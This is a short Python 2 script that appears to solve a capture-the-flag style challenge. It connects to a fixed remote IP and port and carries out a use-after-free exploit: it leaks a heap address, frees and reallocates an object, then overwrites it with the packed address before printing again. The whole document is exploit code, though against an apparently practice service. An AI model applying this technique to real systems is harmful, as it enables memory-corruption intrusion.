import socket
import re
import struct

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_address = ('46.101.80.6', 10000)
sock.connect(server_address)

try:
    # hello
    data = sock.recv(1024)
    print 'received: %s' % data
    # options
    data = sock.recv(1024)
    print 'received: %s' % data
    # print
    sock.sendall("4")
    # get address
    data = sock.recv(1024)
    print 'received: %s' % data
    address = data.strip().split(" ")[4]
    address = address.split("\n")[0]
    address = int(address, 16)
    print address
    # free
    data = sock.recv(1024)
    print 'received: %s' % data
    sock.sendall("2")
    data = sock.recv(1024)
    print 'received: %s' % data
    # remalloc
    data = sock.recv(1024)
    print 'received: %s' % data
    sock.sendall("1")
    data = sock.recv(1024)
    print 'received: %s' % data
    # overwrite
    data = sock.recv(1024)
    print 'received: %s' % data
    sock.sendall("3")
    data = sock.recv(1024)
    print 'received: %s' % data
    message = struct.pack("<Q", address)
    print 'sending: %s' % message
    sock.sendall(message)
    data = sock.recv(1024)
    print 'received: %s' % data
    # print 
    data = sock.recv(1024)
    print 'received: %s' % data
    sock.sendall("4")
    data = sock.recv(1024)
    print 'received: %s' % data

finally:
    print 'closing socket'
    sock.close()
